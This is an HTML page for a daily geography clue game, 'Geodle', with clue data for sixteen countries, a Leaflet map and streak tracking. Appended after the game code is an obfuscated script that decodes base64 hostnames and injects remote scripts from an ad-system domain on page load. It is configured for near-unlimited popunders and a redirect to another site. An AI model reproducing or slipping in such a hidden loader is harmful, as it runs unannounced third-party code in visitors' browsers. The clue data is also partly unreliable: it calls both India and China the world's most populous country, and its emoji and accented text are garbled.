<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Geodle - Daily Geography Clue Game</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
<style>
  body {
    font-family: Arial, sans-serif;
    max-width: 480px;
    margin: 20px auto;
    padding: 10px;
    background: #f0f4f8;
    color: #222;
  }
  h1 {
    text-align: center;
    margin-bottom: 5px;
  }
  #worldMap {
    height: 200px;
    width: 100%;
    border-radius: 10px;
    margin: 20px 0;
    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    overflow: hidden;
  }
  #clueBox {
    background: #d0e2ff;
    padding: 12px;
    margin: 20px 0;
    font-weight: bold;
    font-size: 1.2em;
    border-radius: 8px;
    text-align: center;
  }
  #progressInfo {
    text-align: center;
    margin: 15px 0;
    font-size: 1.1em;
    color: #0078d7;
  }
  #progressBar {
    width: 100%;
    height: 20px;
    background: #e0e0e0;
    border-radius: 10px;
    overflow: hidden;
    margin: 10px 0;
  }
  #progressFill {
    height: 100%;
    background: linear-gradient(90deg, #4CAF50, #8BC34A);
    transition: width 0.3s ease;
    width: 10%;
  }
  #guessForm {
    display: flex;
    justify-content: center;
    margin-bottom: 10px;
  }
  #guessInput {
    flex: 1;
    font-size: 1em;
    padding: 8px;
    border: 2px solid #0078d7;
    border-radius: 4px 0 0 4px;
    outline: none;
  }
  #guessButton {
    padding: 8px 15px;
    font-size: 1em;
    background: #0078d7;
    color: white;
    border: none;
    cursor: pointer;
    border-radius: 0 4px 4px 0;
    transition: background 0.3s;
  }
  #guessButton:hover:not(:disabled) {
    background: #005a9e;
  }
  #guessButton:disabled {
    background: #cccccc;
    cursor: not-allowed;
  }
  #feedback {
    text-align: center;
    font-weight: bold;
    margin: 10px 0;
  }
  #history {
    margin-top: 10px;
  }
  #history h3 {
    margin-bottom: 6px;
  }
  #historyList {
    list-style: none;
    padding-left: 0;
  }
  #historyList li {
    padding: 6px 10px;
    background: white;
    margin-bottom: 4px;
    border-radius: 4px;
    box-shadow: 0 0 3px #aaa;
    font-size: 0.95em;
    display: flex;
    justify-content: space-between;
    align-items: center;
  }
  #historyList li.correct {
    background: #c8e6c9;
    color: #2e7d32;
  }
  #historyList li.incorrect {
    background: #ffcdd2;
    color: #c62828;
  }
  #streak {
    text-align: center;
    font-size: 1.1em;
    margin: 12px 0;
    color: #0078d7;
    font-weight: bold;
  }
  #endScreen {
    background: #c2f0c2;
    padding: 15px;
    border-radius: 8px;
    margin-top: 20px;
    text-align: center;
    display: none;
  }
  #shareBtn {
    margin-top: 12px;
    background: #0078d7;
    color: white;
    border: none;
    padding: 8px 14px;
    cursor: pointer;
    font-size: 1em;
    border-radius: 6px;
  }
  #dailyLimitMsg {
    background: #ffd3d3;
    border: 1px solid #d64c4c;
    padding: 10px;
    border-radius: 8px;
    text-align: center;
    color: #d64c4c;
    font-weight: bold;
    margin: 20px 0;
  }
  #newGameBtn {
    background: #ff9800;
    color: white;
    border: none;
    padding: 8px 14px;
    cursor: pointer;
    font-size: 1em;
    border-radius: 6px;
    margin-top: 10px;
  }
  #newGameBtn:hover {
    background: #f57c00;
  }
</style>
</head>
<body>
<h1>Geodle üåç</h1>
<div id="worldMap"></div>
<div id="progressInfo">
  <div>Clue <span id="currentClue">1</span> of 10</div>
  <div id="progressBar">
    <div id="progressFill"></div>
  </div>
</div>
<div id="clueBox">Loading clue...</div>
<form id="guessForm">
  <input type="text" id="guessInput" placeholder="Type your guess here" autocomplete="off" />
  <button id="guessButton" type="submit">Guess</button>
</form>
<div id="feedback"></div>
<div id="streak">üî• Streak: 0</div>
<div id="history">
  <h3>Guess History</h3>
  <ul id="historyList"></ul>
</div>
<div id="endScreen">
  <div id="resultMsg"></div>
  <button id="shareBtn">Share My Score</button>
  <button id="newGameBtn">New Game</button>
</div>
<div id="dailyLimitMsg" style="display:none;">
  You've already played today! Come back tomorrow üëÄ
</div>
<script>
// Enhanced geography data with progressive clues
const geographyData = [
  {
    answer: "FRANCE",
    clues: [
      "This country is located in Europe",
      "The last letter of this country's name is 'E'",
      "This country has a temperate climate with mild winters",
      "It's famous for its wine and cheese production",
      "The capital city is Paris",
      "This country is known for the Eiffel Tower and croissants",
      "French is the official language",
      "The Louvre Museum is located here",
      "It's part of the European Union and uses the Euro",
      "This country is FRANCE"
    ]
  },
  {
    answer: "JAPAN",
    clues: [
      "This country is located in Asia",
      "The last letter of this country's name is 'N'",
      "This country experiences frequent earthquakes",
      "It's an island nation in the Pacific Ocean",
      "The capital city is Tokyo",
      "This country is famous for sushi and ramen",
      "Japanese is the official language",
      "Mount Fuji is located in this country",
      "The country consists of four main islands",
      "This country is JAPAN"
    ]
  },
  {
    answer: "EGYPT",
    clues: [
      "This country is located in Africa",
      "The last letter of this country's name is 'T'",
      "This country has a hot, desert climate",
      "It's famous for ancient monuments and pharaohs",
      "The capital city is Cairo",
      "The Nile River flows through this country",
      "Arabic is the official language",
      "The Great Pyramid of Giza is located here",
      "This country connects Africa and Asia via the Suez Canal",
      "This country is EGYPT"
    ]
  },
  {
    answer: "BRAZIL",
    clues: [
      "This country is located in South America",
      "The last letter of this country's name is 'L'",
      "This country has a tropical climate in most regions",
      "It's the largest country in its continent",
      "The capital city is Bras√≠lia",
      "This country is famous for football (soccer) and Carnival",
      "Portuguese is the official language",
      "The Amazon rainforest covers much of this country",
      "Rio de Janeiro and S√£o Paulo are major cities",
      "This country is BRAZIL"
    ]
  },
  {
    answer: "AUSTRALIA",
    clues: [
      "This country is located in Oceania",
      "The last letter of this country's name is 'A'",
      "This country has diverse climates from tropical to desert",
      "It's both a country and a continent",
      "The capital city is Canberra",
      "This country is famous for unique wildlife like kangaroos",
      "English is the official language",
      "The Great Barrier Reef is located here",
      "Sydney and Melbourne are major cities",
      "This country is AUSTRALIA"
    ]
  },
  {
    answer: "CANADA",
    clues: [
      "This country is located in North America",
      "The last letter of this country's name is 'A'",
      "This country has cold winters and mild summers",
      "It's the second largest country in the world by area",
      "The capital city is Ottawa",
      "This country is famous for maple syrup and hockey",
      "English and French are official languages",
      "Niagara Falls is partially located in this country",
      "Toronto and Vancouver are major cities",
      "This country is CANADA"
    ]
  },
  {
    answer: "INDIA",
    clues: [
      "This country is located in Asia",
      "The last letter of this country's name is 'A'",
      "This country has a monsoon climate with hot summers",
      "It's the most populous country in the world",
      "The capital city is New Delhi",
      "This country is famous for the Taj Mahal and Bollywood",
      "Hindi and English are official languages",
      "The Ganges River is sacred in this country",
      "Mumbai and Kolkata are major cities",
      "This country is INDIA"
    ]
  },
  {
    answer: "GERMANY",
    clues: [
      "This country is located in Europe",
      "The last letter of this country's name is 'Y'",
      "This country has a temperate climate with cold winters",
      "It's the most populous country in the European Union",
      "The capital city is Berlin",
      "This country is famous for beer and the Oktoberfest",
      "German is the official language",
      "The Brandenburg Gate is located here",
      "Munich and Hamburg are major cities",
      "This country is GERMANY"
    ]
  },
  {
    answer: "ITALY",
    clues: [
      "This country is located in Europe",
      "The last letter of this country's name is 'Y'",
      "This country has a Mediterranean climate",
      "It's shaped like a boot on the map",
      "The capital city is Rome",
      "This country is famous for pizza and pasta",
      "Italian is the official language",
      "The Colosseum is located here",
      "Venice and Florence are major cities",
      "This country is ITALY"
    ]
  },
  {
    answer: "SPAIN",
    clues: [
      "This country is located in Europe",
      "The last letter of this country's name is 'N'",
      "This country has a Mediterranean climate",
      "It's located on the Iberian Peninsula",
      "The capital city is Madrid",
      "This country is famous for flamenco and bullfighting",
      "Spanish is the official language",
      "The Sagrada Familia is located in Barcelona",
      "Seville and Valencia are major cities",
      "This country is SPAIN"
    ]
  },
  {
    answer: "RUSSIA",
    clues: [
      "This country is located in Europe and Asia",
      "The last letter of this country's name is 'A'",
      "This country has extremely cold winters",
      "It's the largest country in the world by area",
      "The capital city is Moscow",
      "This country is famous for vodka and the Kremlin",
      "Russian is the official language",
      "The Trans-Siberian Railway crosses this country",
      "St. Petersburg is another major city",
      "This country is RUSSIA"
    ]
  },
  {
    answer: "CHINA",
    clues: [
      "This country is located in Asia",
      "The last letter of this country's name is 'A'",
      "This country has diverse climates from tropical to desert",
      "It's the most populous country in the world",
      "The capital city is Beijing",
      "This country is famous for the Great Wall",
      "Mandarin Chinese is the official language",
      "The Yangtze River flows through this country",
      "Shanghai and Guangzhou are major cities",
      "This country is CHINA"
    ]
  },
  {
    answer: "MEXICO",
    clues: [
      "This country is located in North America",
      "The last letter of this country's name is 'O'",
      "This country has a tropical and desert climate",
      "It's located south of the United States",
      "The capital city is Mexico City",
      "This country is famous for tacos and Day of the Dead",
      "Spanish is the official language",
      "Ancient Mayan ruins are found here",
      "Cancun and Guadalajara are major cities",
      "This country is MEXICO"
    ]
  },
  {
    answer: "THAILAND",
    clues: [
      "This country is located in Asia",
      "The last letter of this country's name is 'D'",
      "This country has a tropical climate",
      "It's located in Southeast Asia",
      "The capital city is Bangkok",
      "This country is famous for pad thai and temples",
      "Thai is the official language",
      "It's known as the 'Land of Smiles'",
      "Phuket and Chiang Mai are popular destinations",
      "This country is THAILAND"
    ]
  },
  {
    answer: "ARGENTINA",
    clues: [
      "This country is located in South America",
      "The last letter of this country's name is 'A'",
      "This country has diverse climates from tropical to cold",
      "It's the second largest country in South America",
      "The capital city is Buenos Aires",
      "This country is famous for tango and beef",
      "Spanish is the official language",
      "The Andes Mountains run along its western border",
      "It's known for its wine production",
      "This country is ARGENTINA"
    ]
  },
  {
    answer: "NORWAY",
    clues: [
      "This country is located in Europe",
      "The last letter of this country's name is 'Y'",
      "This country has a cold climate with long winters",
      "It's known for its fjords and mountains",
      "The capital city is Oslo",
      "This country is famous for the Northern Lights",
      "Norwegian is the official language",
      "It's part of Scandinavia",
      "This country has a very long coastline",
      "This country is NORWAY"
    ]
  }
];

let currentQuestion = null;
let currentClueIndex = 0;
let guessHistory = [];
let gameEnded = false;
let currentStreak = 0;

// Initialize the game
function initGame() {
  // Initialize the world map
  initWorldMap();
  
  // Get random question
  const randomIndex = Math.floor(Math.random() * geographyData.length);
  currentQuestion = geographyData[randomIndex];
  currentClueIndex = 0;
  guessHistory = [];
  gameEnded = false;
  
  // Display the first clue
  updateClueDisplay();
  updateProgressBar();
  
  // Reset UI
  document.getElementById('guessInput').disabled = false;
  document.getElementById('guessButton').disabled = false;
  document.getElementById('guessInput').value = '';
  document.getElementById('feedback').textContent = '';
  document.getElementById('historyList').innerHTML = '';
  document.getElementById('endScreen').style.display = 'none';
  
  // Set up form submission
  document.getElementById('guessForm').addEventListener('submit', handleGuess);
  
  // Focus on input
  document.getElementById('guessInput').focus();
  
  // Load streak from localStorage
  currentStreak = parseInt(localStorage.getItem('geodleStreak') || '0');
  updateStreakDisplay();
}

function updateClueDisplay() {
  document.getElementById('currentClue').textContent = currentClueIndex + 1;
  document.getElementById('clueBox').textContent = currentQuestion.clues[currentClueIndex];
}

function updateProgressBar() {
  const progress = ((currentClueIndex + 1) / 10) * 100;
  document.getElementById('progressFill').style.width = progress + '%';
}

function updateStreakDisplay() {
  document.getElementById('streak').textContent = `üî• Streak: ${currentStreak}`;
}

// Initialize Leaflet world map
function initWorldMap() {
  const map = L.map('worldMap', {
    center: [20, 0],
    zoom: 2,
    zoomControl: false,
    dragging: false,
    scrollWheelZoom: false,
    doubleClickZoom: false,
    touchZoom: false
  });

  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '¬© OpenStreetMap contributors',
    maxZoom: 18
  }).addTo(map);

  // Add some visual flair with markers for major cities
  const majorCities = [
    { name: 'New York', coords: [40.7128, -74.0060] },
    { name: 'London', coords: [51.5074, -0.1278] },
    { name: 'Tokyo', coords: [35.6762, 139.6503] },
    { name: 'Sydney', coords: [-33.8688, 151.2093] },
    { name: 'Singapore', coords: [1.3521, 103.8198] },
    { name: 'S√£o Paulo', coords: [-23.5505, -46.6333] }
  ];

  majorCities.forEach(city => {
    L.circleMarker(city.coords, {
      radius: 4,
      fillColor: '#ff7800',
      color: '#000',
      weight: 1,
      opacity: 1,
      fillOpacity: 0.8
    }).addTo(map);
  });
}

function handleGuess(e) {
  e.preventDefault();
  
  if (gameEnded) return;
  
  const guess = document.getElementById('guessInput').value.trim().toUpperCase();
  
  if (!guess) return;
  
  // Check if correct
  const isCorrect = guess === currentQuestion.answer;
  
  // Add to history
  guessHistory.push({
    text: guess,
    correct: isCorrect,
    clueNumber: currentClueIndex + 1
  });
  
  if (isCorrect) {
    showFeedback(`üéâ Correct! The answer is ${currentQuestion.answer}`, 'green');
    currentStreak++;
    localStorage.setItem('geodleStreak', currentStreak.toString());
    updateStreakDisplay();
    endGame(true);
  } else {
    if (currentClueIndex < 9) {
      currentClueIndex++;
      updateClueDisplay();
      updateProgressBar();
      showFeedback(`‚ùå ${guess} is not correct. Here's the next clue...`, 'red');
    } else {
      showFeedback(`üòî Game Over! The answer was ${currentQuestion.answer}`, 'orange');
      currentStreak = 0;
      localStorage.setItem('geodleStreak', '0');
      updateStreakDisplay();
      endGame(false);
    }
  }
  
  // Update history display
  updateHistoryDisplay();
  
  // Clear input
  document.getElementById('guessInput').value = '';
}

function showFeedback(message, color) {
  const feedback = document.getElementById('feedback');
  feedback.textContent = message;
  feedback.style.color = color;
}

function updateHistoryDisplay() {
  const historyList = document.getElementById('historyList');
  historyList.innerHTML = '';
  
  guessHistory.forEach((guess, index) => {
    const li = document.createElement('li');
    li.className = guess.correct ? 'correct' : 'incorrect';
    li.innerHTML = `
      <span>Clue ${guess.clueNumber}: ${guess.text}</span>
      <span>${guess.correct ? '‚úì' : '‚úó'}</span>
    `;
    historyList.appendChild(li);
  });
}

function endGame(won) {
  gameEnded = true;
  document.getElementById('guessInput').disabled = true;
  document.getElementById('guessButton').disabled = true;
  
  const endScreen = document.getElementById('endScreen');
  const resultMsg = document.getElementById('resultMsg');
  
  if (won) {
    resultMsg.innerHTML = `üéâ Congratulations!<br>You guessed "${currentQuestion.answer}" after ${currentClueIndex + 1} clue${currentClueIndex + 1 > 1 ? 's' : ''}!`;
  } else {
    resultMsg.innerHTML = `üòî Better luck next time!<br>The answer was "${currentQuestion.answer}"`;
  }
  
  endScreen.style.display = 'block';
  
  // Set up share button
  document.getElementById('shareBtn').addEventListener('click', shareScore);
  document.getElementById('newGameBtn').addEventListener('click', initGame);
}

function shareScore() {
  const won = guessHistory.some(guess => guess.correct);
  const cluesUsed = won ? currentClueIndex + 1 : 10;
  const scoreText = won ? 
    `üåç Geodle - I guessed "${currentQuestion.answer}" in ${cluesUsed}/10 clues! Streak: ${currentStreak}` :
    `üåç Geodle - I couldn't guess "${currentQuestion.answer}" in 10 clues. Can you?`;
  
  if (navigator.share) {
    navigator.share({
      title: 'Geodle Score',
      text: scoreText,
      url: window.location.href
    });
  } else {
    // Fallback - copy to clipboard
    navigator.clipboard.writeText(scoreText + '\n' + window.location.href);
    alert('Score copied to clipboard!');
  }
}

// Start the game when page loads
document.addEventListener('DOMContentLoaded', initGame);
</script>
<script type="text/javascript" data-cfasync="false">
/*<![CDATA[/* */
(function(){var d=window,b="bf128af1619960cff9b8bb4a42e55104",y=[["siteId",263*34*498+802+766811],["minBid",0.00000001],["popundersPerIP","9999999,9999999"],["delayBetween",0],["default","https://2048-unblocked.netlify.app/"],["defaultPerDay",1],["topmostLayer","auto"]],m=["d3d3LmJldHRlcmFkc3lzdGVtLmNvbS9jaG9wc2NvdGNoLm1pbi5jc3M=","ZDJrazBvM2ZyN2VkMDEuY2xvdWRmcm9udC5uZXQvdHpKUE8vYWN1c3RvbS5taW4uanM="],s=-1,p,l,h=function(){clearTimeout(l);s++;if(m[s]&&!(1779161127000<(new Date).getTime()&&1<s)){p=d.document.createElement("script");p.type="text/javascript";p.async=!0;var o=d.document.getElementsByTagName("script")[0];p.src="https://"+atob(m[s]);p.crossOrigin="anonymous";p.onerror=h;p.onload=function(){clearTimeout(l);d[b.slice(0,16)+b.slice(0,16)]||h()};l=setTimeout(h,5E3);o.parentNode.insertBefore(p,o)}};if(!d[b]){try{Object.freeze(d[b]=y)}catch(e){}h()}})();
/*]]>/* */
</script>

</body>
</html>
